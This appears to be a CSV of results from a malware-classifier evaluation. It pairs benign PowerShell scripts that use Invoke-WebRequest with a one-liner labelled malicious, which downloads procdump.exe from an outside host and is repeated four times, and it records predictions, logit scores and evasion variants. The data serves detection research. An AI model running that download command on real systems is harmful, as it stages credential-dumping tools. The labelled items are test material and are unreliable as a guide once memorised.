filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,correct,predicted_label,logit_diff,evasion_variant_id,evasion_technique_id,seed_id,source_pair_idx,predicted_label_variant_eval,variant_logit_diff,baseline_logit_diff_seed
3784.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,592,592,False,"$aliaspage = Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/Azure/azure-rest-api-specs/master/arm-compute/quickstart-templates/aliases.json"" -TimeoutSec 5
$parsedJson = $aliaspage.Content | ConvertFrom-Json

$win10Image = @""
{
    ""publisher"": ""MicrosoftVisualStudio"",
    ""offer"": ""Windows"",
    ""sku"": ""Windows-10-N-x64"",
    ""version"": ""latest""
}
""@

$parsedJson.Outputs.Aliases.Value.Windows | Add-Member -Name ""Win10"" -Value (ConvertFrom-Json $win10Image) -MemberType NoteProperty

ConvertTo-Json $parsedJson.Outputs.Aliases.Value | Set-Content -Path $PSScriptRoot/Images.json",86,benign,Invoke-WebRequest,True,benign,-3.3125,variant_db8e25f9bca3,invoke_webrequest_alias,seed_94c9b9d4d0af,86,benign,-0.296875,0.15625
1362__seed_94c9b9d4d0af__invoke_webrequest_alias.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,66,66,False,iwr -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,86,malicious,Invoke-WebRequest,True,malicious,0.15625,variant_db8e25f9bca3,invoke_webrequest_alias,seed_94c9b9d4d0af,86,benign,-0.296875,0.15625
4058.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,654,654,False,"param(
    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
    [string]$parameters
)

$errorActionPreference = 'Stop'


echo ""download build core script to local with source url: $buildCorePowershellUrl""
$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
Invoke-WebRequest $buildCorePowershellUrl -OutFile ""$buildCorePowershellDestination""


echo ""run build core script with parameters: $parameters""
& ""$buildCorePowershellDestination"" ""$parameters""
exit $LASTEXITCODE",87,benign,Invoke-WebRequest,True,benign,-3.140625,variant_40f3433da701,invoke_webrequest_alias,seed_62bd78f5d825,87,benign,-0.296875,0.15625
1362__seed_62bd78f5d825__invoke_webrequest_alias.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,66,66,False,iwr -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,87,malicious,Invoke-WebRequest,True,malicious,0.15625,variant_40f3433da701,invoke_webrequest_alias,seed_62bd78f5d825,87,benign,-0.296875,0.15625
3104.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-Expression|Invoke-WebRequest,2,True,706,706,False,"param(
    [string]$buildCorePowershellUrl = ""https://opbuildstorageprod.blob.core.windows.net/opps1container/.openpublishing.buildcore.ps1"",
    [string]$parameters
)

$errorActionPreference = 'Stop'


echo ""download build core script to local with source url: $buildCorePowershellUrl""
$repositoryRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
$buildCorePowershellDestination = ""$repositoryRoot\.openpublishing.buildcore.ps1""
Invoke-WebRequest $buildCorePowershellUrl -OutFile $buildCorePowershellDestination


echo ""run build core script with parameters: $parameters""
$arguments = ""-parameters:'$parameters'""
Invoke-Expression ""$buildCorePowershellDestination $arguments""
exit $LASTEXITCODE",88,benign,Invoke-WebRequest,True,benign,-2.578125,variant_7477eb3a262d,invoke_webrequest_alias,seed_e20ff31d1bd4,88,benign,-0.296875,0.15625
1362__seed_e20ff31d1bd4__invoke_webrequest_alias.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,66,66,False,iwr -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,88,malicious,Invoke-WebRequest,True,malicious,0.15625,variant_7477eb3a262d,invoke_webrequest_alias,seed_e20ff31d1bd4,88,benign,-0.296875,0.15625
896.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,839,839,False,"$Random=(New-Guid).ToString().Substring(0,8)


$ResourceGroupName=""myResourceGroup$Random""
$AppName=""AppServiceMonitor$Random""
$Location=""WestUS""


New-AzResourceGroup -Name $ResourceGroupName -Location $Location


New-AzAppservicePlan -Name AppServiceMonitorPlan -ResourceGroupName $ResourceGroupName -Location $Location -Tier Basic


New-AzWebApp -Name $AppName -ResourceGroupName $ResourceGroupName -Location $Location -AppServicePlan AppServiceMonitorPlan


Set-AzWebApp -RequestTracingEnabled $True -HttpLoggingEnabled $True -DetailedErrorLoggingEnabled $True -ResourceGroupName $ResourceGroupName -Name $AppName


Invoke-WebRequest -Method ""Get"" -Uri https://$AppName.azurewebsites.net/404 -ErrorAction SilentlyContinue


Write-Host ""In your browser, download the logs for your app at https://$AppName.scm.azurewebsites.net/api/dump""",89,benign,Invoke-WebRequest,True,benign,-3.25,variant_d0bb8f8f0f04,invoke_webrequest_alias,seed_c4fb6569b404,89,benign,-0.296875,0.15625
1362__seed_c4fb6569b404__invoke_webrequest_alias.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,66,66,False,iwr -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,89,malicious,Invoke-WebRequest,True,malicious,0.15625,variant_d0bb8f8f0f04,invoke_webrequest_alias,seed_c4fb6569b404,89,benign,-0.296875,0.15625
